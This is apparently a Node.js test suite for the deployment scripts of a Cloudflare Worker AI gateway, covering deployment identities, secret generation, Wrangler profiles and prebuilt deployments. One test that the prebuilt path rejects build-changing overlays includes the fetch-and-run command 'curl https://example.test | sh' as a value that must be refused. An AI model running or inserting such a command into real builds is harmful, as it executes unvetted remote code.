import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import {
  chmodSync,
  copyFileSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";
import {
  createMissingGeneratedSecrets,
  DEPLOYMENT_ID_MAX_LENGTH,
  deploymentIdFromVersion,
  deploymentVersionIds,
  missingRequiredSecrets,
  parseSecretList,
  requiredUserSecrets,
  resolveDeploymentId,
} from "../scripts/deploy-lib.mjs";
import {
  listProfiles,
  mergeWranglerConfig,
  prebuiltWranglerConfig,
  resolveWranglerConfig,
  takeProfileArgument,
} from "../scripts/wrangler-config.mjs";

const deterministicRandom = (length) => Buffer.alloc(length, 0xab);

test("reads the newest deployment regardless of list order, including split traffic", () => {
  const old = { created_on: "2026-09-01T00:00:00Z", versions: [{ version_id: "old" }] };
  const current = { created_on: "2026-10-01T00:00:00Z", versions: [{ version_id: "a" }, { version_id: "b" }] };
  for (const deployments of [[old, current], [current, old]]) {
    assert.deepEqual(deploymentVersionIds(JSON.stringify(deployments)), ["a", "b"]);
  }
  assert.deepEqual(deploymentVersionIds("[]"), []);
  for (const invalid of ["{}", "[{}]", JSON.stringify([{ ...current, versions: [] }])]) {
    assert.throws(() => deploymentVersionIds(invalid), /Unexpected Wrangler/u);
  }
});

test("only accepts readable public deployment bindings", () => {
  const output = (bindings) => JSON.stringify({ resources: { bindings } });
  assert.equal(deploymentIdFromVersion(output([])), undefined);
  assert.equal(deploymentIdFromVersion(output([{ name: "DEPLOYMENT_ID", type: "plain_text", text: "" }])), undefined);
  assert.equal(deploymentIdFromVersion(output([{ name: "DEPLOYMENT_ID", type: "plain_text", text: "stable-identity" }])), "stable-identity");
  assert.throws(() => deploymentIdFromVersion("{}"), /Unexpected Wrangler/u);
  assert.throws(() => deploymentIdFromVersion(output([{ name: "DEPLOYMENT_ID", type: "secret_text" }])), /plain-text/u);
});

test("keeps deployed identities, supports explicit initial values, and rejects conflicts", () => {
  const failGenerate = () => assert.fail("must not generate another identity");
  assert.equal(resolveDeploymentId(["deployed-identity"], undefined, "local-identity", failGenerate), "deployed-identity");
  assert.equal(resolveDeploymentId([], "configured-identity", "local-identity", failGenerate), "configured-identity");
  assert.equal(resolveDeploymentId([], undefined, "local-identity", failGenerate), "local-identity");
  assert.equal(resolveDeploymentId(["deployed-identity", "deployed-identity"], "deployed-identity", undefined, failGenerate), "deployed-identity");
  assert.throws(() => resolveDeploymentId(["deployed-identity"], "different-identity"), /differs/u);
  assert.throws(() => resolveDeploymentId(["deployed-identity", undefined]), /disagree/u);
  assert.throws(() => resolveDeploymentId(["deployed-identity", "other-identity"]), /disagree/u);
  assert.throws(() => resolveDeploymentId(["invalid!"]), /Invalid DEPLOYMENT_ID/u);
});

test("keeps a deployment id short enough for the self-host's account id to be recorded", () => {
  // The Worker's own limit, read from its source: this script cannot import TypeScript.
  const source = readFileSync(new URL("../src/policy/deployment.ts", import.meta.url), "utf8");
  const accountIdMax = Number(/export const ACCOUNT_ID_MAX_LENGTH = (\d+);/u.exec(source)?.[1]);
  assert.ok(accountIdMax > 0, "ACCOUNT_ID_MAX_LENGTH is declared in src/policy/deployment.ts");
  assert.equal(DEPLOYMENT_ID_MAX_LENGTH, accountIdMax - "private-".length);

  const longest = "d".repeat(DEPLOYMENT_ID_MAX_LENGTH);
  assert.equal(resolveDeploymentId([], longest), longest);
  assert.throws(() => resolveDeploymentId([], `${longest}d`), /Invalid DEPLOYMENT_ID/u);
  // What the tools generate when nobody configures one.
  assert.match(resolveDeploymentId([], undefined, undefined), /^[0-9a-f-]{36}$/u);
});

// An isolated checkout and persistent fake Cloudflare state exercise separate
// build processes without depending on this checkout's local credentials.
function identityDeploymentFixture(t) {
  const directory = mkdtempSync(join(tmpdir(), "agw-deployment-identity-"));
  t.after(() => rmSync(directory, { recursive: true, force: true }));
  mkdirSync(join(directory, "scripts"));
  for (const name of ["deploy.mjs", "deploy-lib.mjs", "wrangler-config.mjs"]) {
    copyFileSync(new URL(`../scripts/${name}`, import.meta.url), join(directory, "scripts", name));
  }
  symlinkSync(fileURLToPath(new URL("../node_modules", import.meta.url)), join(directory, "node_modules"), "dir");
  writeFileSync(join(directory, "wrangler.jsonc"), JSON.stringify({ name: "fixture-worker" }));
  const fakeWrangler = join(directory, "wrangler.mjs");
  const callLog = join(directory, "calls.ndjson");
  const statePath = join(directory, "state.json");
  writeFileSync(fakeWrangler, `#!/usr/bin/env node
import { appendFileSync, existsSync, readFileSync, writeFileSync } from "node:fs";
const args = process.argv.slice(2);
appendFileSync(process.env.FAKE_WRANGLER_LOG, JSON.stringify(args) + "\\n");
const statePath = process.env.FAKE_STATE;
const state = existsSync(statePath) ? JSON.parse(readFileSync(statePath, "utf8")) : null;
if (args[0] === "deployments") {
  if (process.env.FAKE_FAILURE === "lookup") { console.error("Authentication failed [code: 10000]"); process.exit(1); }
  if (process.env.FAKE_FAILURE === "malformed") { console.log("{}"); process.exit(0); }
  if (!state) { console.error("Worker not found [code: 10007]"); process.exit(1); }
  console.log(JSON.stringify([{ created_on: "2026-10-01T00:00:00Z", versions: [{ version_id: "active-version" }] }]));
}
if (args[0] === "versions") {
  if (process.env.FAKE_FAILURE === "version") { console.error("Network failure"); process.exit(1); }
  console.log(JSON.stringify({ resources: { bindings: state.id === undefined ? [] : [{ name: "DEPLOYMENT_ID", type: "plain_text", text: state.id }] } }));
}
if (args[0] === "secret" && args[1] === "list") {
  console.log(JSON.stringify(["SECRET_VAULT_LOCAL_KEK_V1", "JWT_SECRET", "BETTER_AUTH_SECRET"].map(name => ({ name }))));
}
if (args[0] === "deploy") {
  writeFileSync(statePath, JSON.stringify({ id: args[args.indexOf("--var") + 1].slice("DEPLOYMENT_ID:".length) }));
}
`, { mode: 0o700 });
  return {
    statePath,
    callLog,
    run(extraEnv = {}) {
      return spawnSync(process.execPath, ["scripts/deploy.mjs"], {
        cwd: directory, encoding: "utf8",
        env: { ...process.env, DEPLOYMENT_ID: "", APP_AI_GATEWAY_WRANGLER_BIN: fakeWrangler,
          FAKE_WRANGLER_LOG: callLog, FAKE_STATE: statePath, FAKE_FAILURE: "", ...extraEnv },
      });
    },
  };
}

test("one-click deployment generates a UUID and reuses it in a later build", (t) => {
  const fixture = identityDeploymentFixture(t);
  const first = fixture.run();
  assert.equal(first.status, 0, first.stderr);
  const firstId = JSON.parse(readFileSync(fixture.statePath, "utf8")).id;
  assert.match(firstId, /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/u);
  const second = fixture.run();
  assert.equal(second.status, 0, second.stderr);
  assert.equal(JSON.parse(readFileSync(fixture.statePath, "utf8")).id, firstId);
});

test("an older Worker without an identity receives one automatically", (t) => {
  const fixture = identityDeploymentFixture(t);
  writeFileSync(fixture.statePath, "{}");
  const result = fixture.run();
  assert.equal(result.status, 0, result.stderr);
  assert.ok(JSON.parse(readFileSync(fixture.statePath, "utf8")).id);
});

for (const failure of ["lookup", "version", "malformed", "conflict"]) {
  test(`identity ${failure} stops deployment before any writes`, (t) => {
    const fixture = identityDeploymentFixture(t);
    writeFileSync(fixture.statePath, JSON.stringify({ id: "deployed-identity" }));
    const result = fixture.run({ FAKE_FAILURE: failure, ...(failure === "conflict" ? { DEPLOYMENT_ID: "different-identity" } : {}) });
    assert.notEqual(result.status, 0);
    const calls = readFileSync(fixture.callLog, "utf8").trim().split("\n").map(JSON.parse);
    assert.ok(calls.every(args => ["deployments", "versions"].includes(args[0])));
    assert.equal(JSON.parse(readFileSync(fixture.statePath, "utf8")).id, "deployed-identity");
  });
}

test("parses Wrangler's JSON secret list", () => {
  const names = parseSecretList(
    JSON.stringify([
      { name: "BETTER_AUTH_SECRET", type: "secret_text" },
      { name: "JWT_SECRET", type: "secret_text" },
    ]),
  );
  assert.deepEqual([...names], ["BETTER_AUTH_SECRET", "JWT_SECRET"]);
});

test("reports missing user-provided deployment values", () => {
  assert.deepEqual(missingRequiredSecrets(new Set()), ["SECRET_VAULT_LOCAL_KEK_V1"]);
  assert.deepEqual(missingRequiredSecrets(new Set(["SECRET_VAULT_LOCAL_KEK_V1"])), []);
});

test("deploy button masks the vault key and shows every setting in clear text", () => {
  const projectRoot = new URL("..", import.meta.url);
  const packageJson = JSON.parse(readFileSync(new URL("package.json", projectRoot), "utf8"));
  const wranglerConfig = JSON.parse(
    readFileSync(new URL("wrangler.jsonc", projectRoot), "utf8")
      .replace(/^\s*\/\/.*$/gmu, ""),
  );
  const secretTemplate = readFileSync(new URL(".dev.vars.example", projectRoot), "utf8");

  // The deployment-wide Cloudflare AI Gateway credentials are gone: routing
  // through one is now an optional per-organization choice, not a prerequisite.
  assert.equal(secretTemplate.includes("CF_AIG"), false);
  assert.equal(JSON.stringify(packageJson).includes("CF_AIG"), false);
  assert.equal(JSON.stringify(wranglerConfig).includes("CF_AIG"), false);
  assert.equal(JSON.stringify(wranglerConfig).includes('"AI"'), false);
  assert.match(packageJson.cloudflare.bindings.SECRET_VAULT_LOCAL_KEK_V1.description, /openssl rand -base64 32/u);

  // The form masks every uncommented name in the secret template and shows
  // every `vars` entry as editable text pre-filled with its value. A setting in
  // both would be asked for twice, once behind asterisks, so the key is the
  // only name here and each setting is a var carrying the default it runs on.
  const askedSecrets = secretTemplate
    .split("\n")
    .filter((line) => /^[A-Z0-9_]+=/u.test(line.trim()))
    .map((line) => line.trim().split("=")[0]);
  assert.deepEqual(askedSecrets, ["SECRET_VAULT_LOCAL_KEK_V1"]);
  assert.deepEqual(wranglerConfig.vars, {
    SECRET_VAULT_MODE: "local",
    SECRET_VAULT_LOCAL_KEK_CURRENT_VERSION: "1",
    ALLOWED_REGISTRATION_EMAILS: "",
  });

  // Both halves of the form carry an explanation, and nothing in it is blank.
  for (const name of [...askedSecrets, ...Object.keys(wranglerConfig.vars)]) {
    assert.ok(packageJson.cloudflare.bindings[name]?.description, `${name} has no description`);
  }
  assert.deepEqual(
    Object.keys(packageJson.cloudflare.bindings).filter(
      (name) => !askedSecrets.includes(name) && !(name in wranglerConfig.vars),
    ),
    [],
  );
});

test("generates internal signing secrets once and leaves existing values alone", () => {
  const first = createMissingGeneratedSecrets(new Set(), deterministicRandom);
  assert.equal(Buffer.from(first.JWT_SECRET, "base64url").byteLength, 48);
  assert.equal(Buffer.from(first.BETTER_AUTH_SECRET, "base64url").byteLength, 48);

  const second = createMissingGeneratedSecrets(
    new Set(["JWT_SECRET", "BETTER_AUTH_SECRET"]),
    deterministicRandom,
  );
  assert.deepEqual(second, {});
});

test("deployment uploads generated signing secrets and provisions D1 before migrations", () => {
  const directory = mkdtempSync(join(tmpdir(), "app-ai-gateway-deploy-test-"));
  const fakeWrangler = join(directory, "wrangler.mjs");
  const callLog = join(directory, "calls.ndjson");
  writeFileSync(
    fakeWrangler,
    `#!/usr/bin/env node
import { appendFileSync, existsSync, readFileSync } from "node:fs";
const args = process.argv.slice(2);
const entry = { args };
if (args[0] === "secret" && args[1] === "bulk") entry.input = readFileSync(0, "utf8");
const previous = existsSync(process.env.FAKE_WRANGLER_LOG)
  ? readFileSync(process.env.FAKE_WRANGLER_LOG, "utf8")
  : "";
appendFileSync(process.env.FAKE_WRANGLER_LOG, JSON.stringify(entry) + "\\n");
if (args[0] === "deployments") console.log("[]");
if (args[0] === "secret" && args[1] === "list") {
  console.log(JSON.stringify([{ name: "SECRET_VAULT_LOCAL_KEK_V1" }]));
}
if (
  args[0] === "d1"
  && args[1] === "migrations"
  && !previous.includes('"d1","migrations"')
) {
  console.error(
    "Couldn't find an auto-provisioned D1 DB named 'app-ai-gateway-db' for binding 'DB'. "
    + "Run 'wrangler deploy' to provision it."
  );
  process.exit(1);
}
`,
    { mode: 0o700 },
  );
  chmodSync(fakeWrangler, 0o700);

  try {
    const result = spawnSync(process.execPath, ["scripts/deploy.mjs"], {
      cwd: new URL("..", import.meta.url),
      encoding: "utf8",
      env: {
        ...process.env,
        APP_AI_GATEWAY_WRANGLER_BIN: fakeWrangler,
        FAKE_WRANGLER_LOG: callLog,
        DEPLOYMENT_ID: "deployment-fixture-identity",
      },
    });
    assert.equal(result.status, 0, result.stderr);
    assert.doesNotMatch(result.stdout, /BETTER_AUTH_SECRET=/u);

    const calls = readFileSync(callLog, "utf8")
      .trim()
      .split("\n")
      .map((line) => JSON.parse(line));
    assert.deepEqual(
      calls.map((call) => call.args),
      [
        ["deployments", "list", "--json"],
        ["secret", "list", "--format", "json"],
        ["secret", "bulk"],
        ["d1", "migrations", "apply", "DB", "--remote"],
        ["deploy", "--var", "DEPLOYMENT_ID:deployment-fixture-identity"],
        ["d1", "migrations", "apply", "DB", "--remote"],
      ],
    );

    const uploaded = JSON.parse(calls[2].input);
    assert.deepEqual(Object.keys(uploaded), ["JWT_SECRET", "BETTER_AUTH_SECRET"]);
    assert.equal(Buffer.from(uploaded.JWT_SECRET, "base64url").byteLength, 48);
    assert.equal(Buffer.from(uploaded.BETTER_AUTH_SECRET, "base64url").byteLength, 48);
  } finally {
    rmSync(directory, { recursive: true, force: true });
  }
});

test("deployment profiles merge an overlay over the tracked configuration", () => {
  assert.deepEqual(
    mergeWranglerConfig(
      {
        name: "gateway",
        workers_dev: true,
        vars: { SECRET_VAULT_MODE: "local", SECRET_VAULT_LOCAL_KEK_CURRENT_VERSION: "1" },
        migrations: [{ tag: "v1" }],
        d1_databases: [{ binding: "DB", migrations_dir: "migrations" }],
      },
      {
        workers_dev: false,
        vars: { SECRET_VAULT_MODE: "kms", SECRET_VAULT_LOCAL_KEK_CURRENT_VERSION: null },
        d1_databases: [{ binding: "DB", database_id: "id", migrations_dir: "migrations" }],
        services: [{ binding: "BILLING", service: "billing" }],
      },
    ),
    {
      name: "gateway",
      workers_dev: false,
      vars: { SECRET_VAULT_MODE: "kms" },
      migrations: [{ tag: "v1" }],
      d1_databases: [{ binding: "DB", database_id: "id", migrations_dir: "migrations" }],
      services: [{ binding: "BILLING", service: "billing" }],
    },
  );
});

test("required operator secrets follow the resolved vault mode", () => {
  assert.deepEqual(requiredUserSecrets({}), ["SECRET_VAULT_LOCAL_KEK_V1"]);
  assert.deepEqual(
    requiredUserSecrets({ vars: { SECRET_VAULT_MODE: "local", SECRET_VAULT_LOCAL_KEK_CURRENT_VERSION: "2" } }),
    ["SECRET_VAULT_LOCAL_KEK_V2"],
  );
  assert.deepEqual(
    requiredUserSecrets({ vars: { SECRET_VAULT_MODE: "kms" } }),
    ["SECRET_VAULT_KMS_URL", "SECRET_VAULT_KMS_TOKEN"],
  );
});

test("a profile writes a generated config beside its sources and points Wrangler at it", () => {
  const directory = mkdtempSync(join(tmpdir(), "app-ai-gateway-profile-test-"));
  try {
    writeFileSync(
      join(directory, "wrangler.jsonc"),
      `{
  // The tracked configuration keeps comments.
  "name": "gateway",
  "main": "src/index.ts",
  "vars": { "SECRET_VAULT_MODE": "local" },
  "migrations": [{ "tag": "v1", "new_sqlite_classes": ["UserLimiter"] }],
}
`,
    );
    writeFileSync(
      join(directory, "wrangler.prod.overlay.jsonc"),
      `{ "routes": [{ "pattern": "console.example.com", "custom_domain": true }] }`,
    );

    assert.deepEqual(listProfiles(directory), ["prod"]);

    const plain = resolveWranglerConfig(undefined, directory);
    assert.deepEqual(plain.configArgs, []);
    assert.equal(plain.config.name, "gateway");

    const { config, configPath, configArgs } = resolveWranglerConfig("prod", directory);
    assert.equal(configPath, join(directory, "wrangler.prod.generated.jsonc"));
    assert.deepEqual(configArgs, ["--config", configPath]);
    assert.deepEqual(config.routes, [{ pattern: "console.example.com", custom_domain: true }]);
    assert.deepEqual(config.migrations, [{ tag: "v1", new_sqlite_classes: ["UserLimiter"] }]);

    const generated = readFileSync(configPath, "utf8");
    assert.match(generated, /^\/\/ Generated from wrangler\.jsonc and wrangler\.prod\.overlay\.jsonc/u);
    assert.deepEqual(JSON.parse(generated.replace(/^\/\/.*$/gmu, "")), config);

    assert.throws(
      () => resolveWranglerConfig("staging", directory),
      /Deployment profile "staging" not found[\s\S]*Available profiles: prod/u,
    );
    assert.throws(() => resolveWranglerConfig("../etc", directory), /Invalid deployment profile name/u);
  } finally {
    rmSync(directory, { recursive: true, force: true });
  }
});

test("--profile is separated from the remaining Wrangler arguments", () => {
  assert.deepEqual(takeProfileArgument(["deploy", "--profile", "prod", "--dry-run"]), {
    profile: "prod",
    rest: ["deploy", "--dry-run"],
  });
  assert.deepEqual(takeProfileArgument(["deploy", "--profile=prod"]), {
    profile: "prod",
    rest: ["deploy"],
  });
  assert.deepEqual(takeProfileArgument(["deploy"]), { profile: undefined, rest: ["deploy"] });
  assert.throws(() => takeProfileArgument(["deploy", "--profile"]), /requires a name/u);
});

test("deploying a profile passes the generated config to every Wrangler call", () => {
  const projectRoot = new URL("..", import.meta.url);
  const profile = `zz-test-${process.pid}`;
  const overlayPath = new URL(`wrangler.${profile}.overlay.jsonc`, projectRoot);
  const generatedPath = new URL(`wrangler.${profile}.generated.jsonc`, projectRoot);
  const directory = mkdtempSync(join(tmpdir(), "app-ai-gateway-deploy-profile-test-"));
  const fakeWrangler = join(directory, "wrangler.mjs");
  const callLog = join(directory, "calls.ndjson");
  writeFileSync(
    fakeWrangler,
    `#!/usr/bin/env node
import { appendFileSync } from "node:fs";
const args = process.argv.slice(2);
appendFileSync(process.env.FAKE_WRANGLER_LOG, JSON.stringify({ args }) + "\\n");
if (args[0] === "deployments") console.log("[]");
if (args[0] === "secret" && args[1] === "list") {
  console.log(JSON.stringify([
    { name: "SECRET_VAULT_KMS_URL" },
    { name: "SECRET_VAULT_KMS_TOKEN" },
    { name: "JWT_SECRET" },
    { name: "BETTER_AUTH_SECRET" },
  ]));
}
`,
    { mode: 0o700 },
  );
  chmodSync(fakeWrangler, 0o700);
  writeFileSync(overlayPath, `{ "vars": { "SECRET_VAULT_MODE": "kms" } }\n`);

  try {
    const result = spawnSync(process.execPath, ["scripts/deploy.mjs", "--profile", profile], {
      cwd: projectRoot,
      encoding: "utf8",
      env: { ...process.env, APP_AI_GATEWAY_WRANGLER_BIN: fakeWrangler, FAKE_WRANGLER_LOG: callLog, DEPLOYMENT_ID: "deployment-fixture-identity" },
    });
    assert.equal(result.status, 0, result.stderr);

    const configArgs = ["--config", fileURLToPath(generatedPath)];
    const calls = readFileSync(callLog, "utf8").trim().split("\n").map((line) => JSON.parse(line).args);
    assert.deepEqual(calls, [
      ["deployments", "list", "--json", ...configArgs],
      ["secret", "list", "--format", "json", ...configArgs],
      ["d1", "migrations", "apply", "DB", "--remote", ...configArgs],
      ["deploy", ...configArgs, "--var", "DEPLOYMENT_ID:deployment-fixture-identity"],
    ]);

    const generated = JSON.parse(readFileSync(generatedPath, "utf8").replace(/^\/\/.*$/gmu, ""));
    assert.equal(generated.vars.SECRET_VAULT_MODE, "kms");
    assert.equal(generated.name, "app-ai-gateway");
  } finally {
    rmSync(directory, { recursive: true, force: true });
    rmSync(overlayPath, { force: true });
    rmSync(generatedPath, { force: true });
  }
});


test("filling a missing deployment secret never overwrites established signing material", () => {
  const projectRoot = new URL("..", import.meta.url);
  const profile = `zz-missing-${process.pid}`;
  const overlayPath = new URL(`wrangler.${profile}.overlay.jsonc`, projectRoot);
  const generatedPath = new URL(`wrangler.${profile}.generated.jsonc`, projectRoot);
  const varsPath = new URL(`.dev.vars.${profile}`, projectRoot);
  const directory = mkdtempSync(join(tmpdir(), "agw-missing-secret-"));
  const fakeWrangler = join(directory, "wrangler.mjs"), callLog = join(directory, "calls.ndjson");
  writeFileSync(fakeWrangler, `#!/usr/bin/env node
import { appendFileSync, readFileSync, existsSync } from "node:fs";
const args=process.argv.slice(2), log=process.env.FAKE_WRANGLER_LOG;
const previous=existsSync(log)?readFileSync(log,"utf8"):"";
const input=args[0]==="secret"&&args[1]==="bulk"?readFileSync(0,"utf8"):undefined;
appendFileSync(log,JSON.stringify({args,input})+"\\n");
if(args[0]==="deployments")console.log("[]");
if(args[0]==="secret"&&args[1]==="list")console.log(JSON.stringify([
 {name:"JWT_SECRET"},{name:"BETTER_AUTH_SECRET"},...(previous.includes('"bulk"')?[{name:"SECRET_VAULT_LOCAL_KEK_V1"}]:[])
]));
`, { mode: 0o700 });
  writeFileSync(overlayPath, JSON.stringify({ vars: { DEPLOYMENT_ID: "stable-deployment-fixture" } }));
  writeFileSync(varsPath, "JWT_SECRET=must-not-replace\nBETTER_AUTH_SECRET=must-not-replace\nSECRET_VAULT_LOCAL_KEK_V1=fixture-vault\nDEPLOYMENT_ID=local-development-id\n");
  try {
    const result=spawnSync(process.execPath,["scripts/deploy.mjs","--profile",profile],{
      cwd:projectRoot,encoding:"utf8",env:{...process.env,DEPLOYMENT_ID:"stable-deployment-fixture",APP_AI_GATEWAY_WRANGLER_BIN:fakeWrangler,FAKE_WRANGLER_LOG:callLog},
    });
    assert.equal(result.status,0,result.stderr);
    const calls=readFileSync(callLog,"utf8").trim().split("\n").map(line=>JSON.parse(line));
    assert.deepEqual(calls.filter(call=>call.input).map(call=>JSON.parse(call.input)),[{SECRET_VAULT_LOCAL_KEK_V1:"fixture-vault"}]);
    assert.doesNotMatch(result.stdout,/must-not-replace|fixture-vault/);
  } finally {
    for(const path of [overlayPath,generatedPath,varsPath])rmSync(path,{force:true});
    rmSync(directory,{recursive:true,force:true});
  }
});

/** A directory laid out as scripts/build-prebuilt.mjs writes it. */
function prebuiltFixture(t) {
  const dir = mkdtempSync(join(tmpdir(), "agw-prebuilt-"));
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  mkdirSync(join(dir, "built/worker"), { recursive: true });
  mkdirSync(join(dir, "built/console"), { recursive: true });
  writeFileSync(join(dir, "built/worker/index.js"), "export default {};\n");
  writeFileSync(join(dir, "built/console/index.html"), "<!doctype html>\n");
  return dir;
}

test("a prebuilt deployment deploys the built files unbundled and keeps the rest of the config", (t) => {
  const dir = prebuiltFixture(t);
  const base = {
    name: "app-ai-gateway",
    main: "src/index.ts",
    compatibility_date: "2026-09-02",
    compatibility_flags: ["nodejs_compat"],
    assets: { directory: "./console/dist", not_found_handling: "single-page-application" },
    d1_databases: [{ binding: "DB", migrations_dir: "migrations" }],
  };
  const merged = mergeWranglerConfig(base, { routes: [{ pattern: "api.example.test", custom_domain: true }] });
  const config = prebuiltWranglerConfig(base, merged, "built", dir);
  assert.equal(config.main, join("built", "worker", "index.js"));
  assert.equal(config.no_bundle, true);
  assert.deepEqual(config.assets, { directory: join("built", "console"), not_found_handling: "single-page-application" });
  // Migrations and everything else still come from the checkout and the profile.
  assert.deepEqual(config.d1_databases, base.d1_databases);
  assert.deepEqual(config.routes, merged.routes);
});

test("a prebuilt deployment refuses a profile that changes how the Worker is built", (t) => {
  const dir = prebuiltFixture(t);
  const base = { name: "app-ai-gateway", main: "src/index.ts", compatibility_date: "2026-09-02", assets: { directory: "./console/dist" } };
  // The same value is fine: an overlay may repeat the tracked date.
  assert.doesNotThrow(() => prebuiltWranglerConfig(base, { ...base, compatibility_date: "2026-09-02" }, "built", dir));
  for (const change of [
    { compatibility_date: "2026-10-01" },
    { compatibility_flags: ["nodejs_compat"] },
    { build: { command: "curl https://example.test | sh" } },
    { define: { DEBUG: "true" } },
  ]) {
    assert.throws(() => prebuiltWranglerConfig(base, { ...base, ...change }, "built", dir), /decides how the Worker is built/u);
  }
  assert.throws(() => prebuiltWranglerConfig(base, base, "missing", dir), /not a prebuilt gateway/u);
});

test("deploying a prebuilt gateway passes its generated config to every Wrangler call", (t) => {
  const projectRoot = new URL("..", import.meta.url);
  const profile = `zz-prebuilt-${process.pid}`;
  const overlayPath = new URL(`wrangler.${profile}.overlay.jsonc`, projectRoot);
  const generatedPath = new URL(`wrangler.${profile}.prebuilt.generated.jsonc`, projectRoot);
  const fixture = prebuiltFixture(t);
  const fakeWrangler = join(fixture, "wrangler.mjs");
  const callLog = join(fixture, "calls.ndjson");
  writeFileSync(
    fakeWrangler,
    `#!/usr/bin/env node
import { appendFileSync } from "node:fs";
const args = process.argv.slice(2);
appendFileSync(process.env.FAKE_WRANGLER_LOG, JSON.stringify({ args }) + "\\n");
if (args[0] === "deployments") console.log("[]");
if (args[0] === "secret" && args[1] === "list") {
  console.log(JSON.stringify([{ name: "SECRET_VAULT_LOCAL_KEK_V1" }, { name: "JWT_SECRET" }, { name: "BETTER_AUTH_SECRET" }]));
}
`,
    { mode: 0o700 },
  );
  writeFileSync(overlayPath, `{ "workers_dev": false }\n`);
  t.after(() => {
    rmSync(overlayPath, { force: true });
    rmSync(generatedPath, { force: true });
  });

  const prebuilt = join(fixture, "built");
  const result = spawnSync(process.execPath, ["scripts/deploy.mjs", "--profile", profile, "--prebuilt", prebuilt], {
    cwd: projectRoot,
    encoding: "utf8",
    env: { ...process.env, APP_AI_GATEWAY_WRANGLER_BIN: fakeWrangler, FAKE_WRANGLER_LOG: callLog, DEPLOYMENT_ID: "deployment-fixture-identity" },
  });
  assert.equal(result.status, 0, result.stderr);

  const configArgs = ["--config", fileURLToPath(generatedPath)];
  const calls = readFileSync(callLog, "utf8").trim().split("\n").map((line) => JSON.parse(line).args);
  assert.deepEqual(calls, [
    ["deployments", "list", "--json", ...configArgs],
    ["secret", "list", "--format", "json", ...configArgs],
    ["d1", "migrations", "apply", "DB", "--remote", ...configArgs],
    ["deploy", ...configArgs, "--var", "DEPLOYMENT_ID:deployment-fixture-identity"],
  ]);
  const generated = JSON.parse(readFileSync(generatedPath, "utf8").replace(/^\/\/.*$/gmu, ""));
  assert.equal(generated.no_bundle, true);
  assert.equal(generated.workers_dev, false);
  assert.match(generated.main, /built[/\\]worker[/\\]index\.js$/u);
  assert.equal(generated.d1_databases[0].migrations_dir, "migrations");
});

test("the deploy job's tools are the versions the repository builds and tests with", () => {
  const root = new URL("..", import.meta.url);
  const tools = JSON.parse(readFileSync(new URL("deploy/package.json", root), "utf8")).dependencies;
  const lock = readFileSync(new URL("pnpm-lock.yaml", root), "utf8");
  // The root importer of the project's own lockfile document (pnpm writes its
  // own setup as an earlier document), up to the next importer.
  const projectLock = lock.slice(lock.lastIndexOf("\nimporters:\n"));
  const rootImporter = /\n  \.:\n([\s\S]*?)\n  [^\s.][^\n]*:\n/u.exec(projectLock)?.[1] ?? "";
  for (const name of ["wrangler", "jsonc-parser"]) {
    const resolved = new RegExp(`\\n      ${name}:\\n        specifier: [^\\n]+\\n        version: ([0-9][^(\\n]*)`, "u").exec(rootImporter)?.[1];
    assert.ok(resolved, `${name} is not in the root importer of pnpm-lock.yaml`);
    assert.equal(tools[name], resolved, `deploy/package.json pins ${name} ${tools[name]}, but the repository uses ${resolved}`);
  }
});
